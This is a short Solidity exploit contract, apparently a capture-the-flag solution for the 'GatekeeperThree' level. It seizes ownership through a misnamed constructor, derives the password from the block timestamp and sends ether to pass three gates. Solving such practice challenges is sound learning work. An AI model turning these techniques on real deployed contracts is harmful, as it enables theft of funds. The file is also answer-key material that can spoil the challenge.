// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import { GatekeeperThree } from "src/Level28.sol";

contract L28Attack {
    GatekeeperThree gk;

    constructor(GatekeeperThree _gk) {
        gk = _gk;
    }

    function attack() external payable {
        // gate one
        gk.construct0r();
        // gate two
        gk.trick().checkPassword(0); // this sets the password to the current block timestamp
        gk.getAllowance(block.timestamp);
        require(gk.allowEntrance() == true, "failed to set allow entrance");
        // gate three
        (bool success,) = payable(address(gk)).call{ value: 0.001 ether + 1 }("");
        require(success, "failed to send ether");
        // enter
        gk.enter();
    }
}
